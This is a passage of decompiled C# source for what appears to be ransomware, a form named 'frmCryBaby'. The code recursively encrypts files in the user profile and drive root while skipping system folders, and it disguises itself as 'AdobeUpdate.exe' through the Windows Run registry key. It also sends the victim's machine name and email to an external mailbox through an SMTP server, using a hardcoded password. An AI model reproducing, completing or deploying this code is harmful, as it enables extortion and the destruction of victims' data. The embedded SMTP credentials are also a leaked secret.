					GetSpecifiedFiles(current2.FullName);
					goto IL_0049;
					IL_0098:
					num = 9;
					goto IL_009c;
					IL_0063:
					num = 7;
					enumerator2 = directoryInfo.EnumerateFiles().GetEnumerator();
					goto IL_009c;
					IL_009c:
					if (enumerator2.MoveNext())
					{
						current = enumerator2.Current;
						goto IL_007d;
					}
					enumerator2?.Dispose();
					goto end_IL_0001_2;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 249;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void GetAllFiles(string strPath)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator<FileInfo> enumerator = default(IEnumerator<FileInfo>);
		IEnumerator<DirectoryInfo> enumerator2 = default(IEnumerator<DirectoryInfo>);
		DirectoryInfo current = default(DirectoryInfo);
		FileInfo current2 = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					directoryInfo = new DirectoryInfo(strPath);
					goto IL_000b;
				case 298:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_0040;
						case 6:
							goto IL_0067;
						case 7:
						case 8:
							goto IL_0076;
						case 9:
							goto IL_008a;
						case 10:
							goto IL_00a5;
						case 11:
							goto IL_00c1;
						default:
							goto end_IL_0001;
						case 12:
						case 13:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_008a:
					num = 9;
					enumerator = directoryInfo.EnumerateFiles().GetEnumerator();
					goto IL_00c5;
					IL_00c1:
					num = 11;
					goto IL_00c5;
					IL_000b:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0014;
					IL_0014:
					num = 3;
					if (!directoryInfo.get_Exists())
					{
						goto end_IL_0001_2;
					}
					goto IL_0022;
					IL_0022:
					num = 4;
					enumerator2 = directoryInfo.EnumerateDirectories().GetEnumerator();
					goto IL_0031;
					IL_0031:
					if (enumerator2.MoveNext())
					{
						current = enumerator2.Current;
						goto IL_0040;
					}
					enumerator2?.Dispose();
					goto IL_008a;
					IL_00c5:
					if (enumerator.MoveNext())
					{
						current2 = enumerator.Current;
						goto IL_00a5;
					}
					enumerator?.Dispose();
					goto end_IL_0001_2;
					IL_0040:
					num = 5;
					if (Operators.CompareString(current.FullName, User_Profile_Path + "\\AppData", false) != 0)
					{
						goto IL_0067;
					}
					goto IL_0076;
					IL_0067:
					num = 6;
					GetAllFiles(current.FullName);
					goto IL_0076;
					IL_0076:
					num = 8;
					goto IL_0031;
					IL_00a5:
					num = 10;
					AddFileName(strPath + "\\" + current2.get_Name(), current2);
					goto IL_00c1;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 298;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void AddFileName(string strName, FileInfo objFile)
	{
		Crypto_Pass = Crypto_Dec_Key;
		Crypto_File_Original = strName;
		if (Crypto_EncDec)
		{
			if (Operators.CompareString(Path.GetExtension(Crypto_File_Original), ".encrypt", false) != 0)
			{
				Crypto_File_New = Crypto_File_Original + ".encrypt";
				EncryptDecryptFile(Crypto_Pass, Crypto_File_Original, Crypto_File_New, Crypto_EncDec);
			}
		}
		else
		{
			Crypto_File_New = Crypto_File_Original.Substring(0, checked(Crypto_File_Original.Length - 8));
			EncryptDecryptFile(Crypto_Pass, Crypto_File_Original, Crypto_File_New, Crypto_EncDec);
		}
	}

	public void AddRootFile(string strName, FileInfo objFile)
	{
		Crypto_Pass = Crypto_Dec_Key;
		Crypto_File_Original = strName;
		if (Crypto_EncDec)
		{
			Crypto_File_New = Crypto_File_Original + ".encrypt";
			EncryptDecryptFile(Crypto_Pass, Crypto_File_Original, Crypto_File_New, Crypto_EncDec);
		}
		else
		{
			Crypto_File_New = Crypto_File_Original.Substring(0, checked(Crypto_File_Original.Length - 8));
			EncryptDecryptFile(Crypto_Pass, Crypto_File_Original, Crypto_File_New, Crypto_EncDec);
		}
	}

	public void GetRootFiles(string strPath)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		int num2 = default(int);
		int num3 = default(int);
		FileInfo current = default(FileInfo);
		IEnumerator<DirectoryInfo> enumerator = default(IEnumerator<DirectoryInfo>);
		DirectoryInfo current2 = default(DirectoryInfo);
		IEnumerator<FileInfo> enumerator2 = default(IEnumerator<FileInfo>);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					directoryInfo = new DirectoryInfo(strPath);
					goto IL_000b;
				case 953:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_0043;
						case 7:
							goto IL_006a;
						case 9:
							goto IL_0091;
						case 11:
							goto IL_00b9;
						case 13:
							goto IL_00e1;
						case 15:
							goto IL_0109;
						case 17:
							goto IL_0131;
						case 19:
							goto IL_0159;
						case 21:
							goto IL_0181;
						case 23:
							goto IL_01a9;
						case 25:
							goto IL_01ce;
						case 27:
							goto IL_01f3;
						case 29:
							goto IL_0218;
						case 30:
							goto IL_021c;
						case 6:
						case 8:
						case 10:
						case 12:
						case 14:
						case 16:
						case 18:
						case 20:
						case 22:
						case 24:
						case 26:
						case 28:
						case 31:
						case 32:
							goto IL_022c;
						case 33:
							goto IL_0244;
						case 34:
							goto IL_0266;
						case 36:
							goto IL_0280;
						case 38:
							goto IL_029a;
						case 40:
							goto IL_02b4;
						case 41:
							goto IL_02b8;
						case 35:
						case 37:
						case 39:
						case 42:
						case 43:
							goto IL_02d4;
						default:
							goto end_IL_0001;
						case 44:
						case 45:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0280:
					num = 36;
					if (Operators.CompareString(current.get_Name(), "PageFile.sys", false) != 0)
					{
						goto IL_029a;
					}
					goto IL_02d4;
					IL_0266:
					num = 34;
					if (Operators.CompareString(current.get_Name(), "hiberfil.sys", false) != 0)
					{
						goto IL_0280;
					}
					goto IL_02d4;
					IL_000b:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0014;
					IL_0014:
					num = 3;
					if (!directoryInfo.get_Exists())
					{
						goto end_IL_0001_2;
					}
					goto IL_0022;
					IL_0022:
					num = 4;
					enumerator = directoryInfo.EnumerateDirectories().GetEnumerator();
					goto IL_0031;
					IL_0031:
					if (enumerator.MoveNext())
					{
						current2 = enumerator.Current;
						goto IL_0043;
					}
					enumerator?.Dispose();
					goto IL_0244;
					IL_029a:
					num = 38;
					if (Operators.CompareString(current.get_Name(), "swapfile.sys", false) != 0)
					{
						goto IL_02b4;
					}
					goto IL_02d4;
					IL_0043:
					num = 5;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "$Recycle.Bin", false) != 0)
					{
						goto IL_006a;
					}
					goto IL_022c;
					IL_006a:
					num = 7;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "Users", false) != 0)
					{
						goto IL_0091;
					}
					goto IL_022c;
					IL_0091:
					num = 9;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "OEM", false) != 0)
					{
						goto IL_00b9;
					}
					goto IL_022c;
					IL_00b9:
					num = 11;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "Windows", false) != 0)
					{
						goto IL_00e1;
					}
					goto IL_022c;
					IL_00e1:
					num = 13;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "Program Files", false) != 0)
					{
						goto IL_0109;
					}
					goto IL_022c;
					IL_0109:
					num = 15;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "Program Files (x86)", false) != 0)
					{
						goto IL_0131;
					}
					goto IL_022c;
					IL_0131:
					num = 17;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "ProgramData", false) != 0)
					{
						goto IL_0159;
					}
					goto IL_022c;
					IL_0159:
					num = 19;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "PerfLogs", false) != 0)
					{
						goto IL_0181;
					}
					goto IL_022c;
					IL_0181:
					num = 21;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "Recovery", false) != 0)
					{
						goto IL_01a9;
					}
					goto IL_022c;
					IL_01a9:
					num = 23;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "System Volume Information", false) != 0)
					{
						goto IL_01ce;
					}
					goto IL_022c;
					IL_01ce:
					num = 25;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "$SysReset", false) != 0)
					{
						goto IL_01f3;
					}
					goto IL_022c;
					IL_01f3:
					num = 27;
					if (Operators.CompareString(current2.FullName, directoryInfo.ToString() + "$AppxLogs", false) != 0)
					{
						goto IL_0218;
					}
					goto IL_022c;
					IL_0218:
					num = 29;
					goto IL_021c;
					IL_021c:
					num = 30;
					GetRootFiles(current2.FullName);
					goto IL_022c;
					IL_022c:
					num = 32;
					goto IL_0031;
					IL_02b4:
					num = 40;
					goto IL_02b8;
					IL_02b8:
					num = 41;
					AddRootFile(strPath + "\\" + current.get_Name(), current);
					goto IL_02d4;
					IL_0244:
					num = 33;
					enumerator2 = directoryInfo.EnumerateFiles().GetEnumerator();
					goto IL_0255;
					IL_0255:
					if (enumerator2.MoveNext())
					{
						current = enumerator2.Current;
						goto IL_0266;
					}
					enumerator2?.Dispose();
					goto end_IL_0001_2;
					IL_02d4:
					num = 43;
					goto IL_0255;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 953;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void profileWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		GetAllFiles(User_Profile_Path);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void profileWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		if (Crypto_EncDec)
		{
			lblNotify.set_Text(">>> Encryption Complete <<<");
			((Control)lblNotify).set_Visible(true);
			((Control)cmdSend).set_Enabled(true);
			((Control)txtEmailAddess).set_Enabled(true);
			MySettingsProperty.Settings.FirstRun = false;
			((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
			((Control)MyProject.Forms.frmBackground).Show();
			((Control)this).set_Visible(true);
		}
		else
		{
			lblNotify.set_Text(">>> Decryption Complete <<<");
			Interaction.MsgBox((object)"All Files Restored...", (MsgBoxStyle)0, (object)"Relief");
			if (((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().GetValue("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "AdobeUpdate.exe", RegistryValueOptions.None) != null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue("AdobeUpdate.exe");
			}
			ProjectData.EndApp();
		}
	}

	private void cmdDecrypt_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(txtCryptoPassword.get_Text(), Crypto_Dec_Key, false) == 0)
		{
			((Control)cmdDecrypt).set_Enabled(false);
			lblNotify.set_Text("Please Wait...\r\n\r\nDo Not Interrupt This Process");
			Crypto_EncDec = false;
			profileWorker.RunWorkerAsync();
		}
	}

	private void cmdSend_Click(object sender, EventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Invalid comparison between Unknown and I4
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		if ((int)Interaction.MsgBox((object)"Are You Sure This Email Address Is Correct?", (MsgBoxStyle)4, (object)"Checking") == 6)
		{
			((Control)cmdSend).set_Enabled(false);
			((Control)txtEmailAddess).set_Enabled(false);
			try
			{
				SmtpClient smtpClient = new SmtpClient();
				MailMessage mailMessage = new MailMessage();
				mailMessage = new MailMessage();
				mailMessage.From = new MailAddress("easysend@authsmtp.co.za");
				mailMessage.To.Add("easy-crypto@tutanota.com");
				mailMessage.Subject = "Request - Decrypt";
				mailMessage.Body = "Machine Name : " + Environment.MachineName + "\r\nEmail Address : " + txtEmailAddess.get_Text();
				smtpClient.Credentials = new NetworkCredential("easysend@authsmtp.co.za", "vuLkyWHA$cR9T6BE");
				smtpClient.Port = 587;
				smtpClient.Host = "smtp.authsmtp.co.za";
				smtpClient.Send(mailMessage);
				Interaction.MsgBox((object)"Your Details Have Been Sent", (MsgBoxStyle)0, (object)"Communication");
				((Control)cmdDecrypt).set_Enabled(true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Interaction.MsgBox((object)"Message Not Sent", (MsgBoxStyle)0, (object)"Communication");
				((Control)cmdSend).set_Enabled(true);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void frmCryBaby_FormClosing(object sender, FormClosingEventArgs e)
	{
		((Form)MyProject.Forms.frmBackground).Close();
	}

	public void LoadRegValues()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					string value = Strings.Format((object)DateAndTime.get_Now(), "yyyy/MM/dd");
					string value2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AdobeUpdate", writable: true)!.GetValue("AdobeUpdateRun"));
					DateTime dateTime = Convert.ToDateTime(value);
					DateTime dateTime2 = Convert.ToDateTime(value2);
					Is_Run_Day = checked((int)DateAndTime.DateDiff((DateInterval)4, dateTime, dateTime2, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
					DoWork();
					goto end_IL_0001;
				}
				case 126:
					num = -1;
					switch (num2)
					{
					case 2:
						Is_Run_Day = 0;
						DoWork();
						goto end_IL_0001;
					}
					break;
				}
				goto IL_00b8;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 126;
				continue;
			}
			break;
			IL_00b8:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void DoWork()
	{
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (Is_Run_Day <= 0)
			{
				Crypto3D crypto3D = new Crypto3D(User_Computer_Name.ToUpper());
				string key = crypto3D.EncryptData(txtXMR.get_Text());
				Crypto3D crypto3D2 = new Crypto3D(key);
				string text = (Crypto_Dec_Key = crypto3D2.EncryptData(txtXMR.get_Text()));
				if (MySettingsProperty.Settings.FirstRun)
				{
					Crypto_EncDec = true;
					lblNotify.set_Text("Encrypting Files...\r\n\r\nDo Not Interrupt This Process.\r\nFiles Will Be Unrecoverable If Interrupted.");
					((Control)lblNotify).set_Visible(true);
					profileWorker.RunWorkerAsync();
					rootWorker.RunWorkerAsync();
				}
				else
				{
					((Control)cmdDecrypt).set_Enabled(true);
					((Control)this).set_Visible(true);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			Interaction.MsgBox((object)"AdodeUpdate Error", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void frmCryBaby_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		LoadRegValues();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void cmdExit_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	private void rootWorker_DoWork(object sender, DoWorkEventArgs e)
	{
		GetRootFiles(Path.GetPathRoot(User_Profile_Path));
	}
}
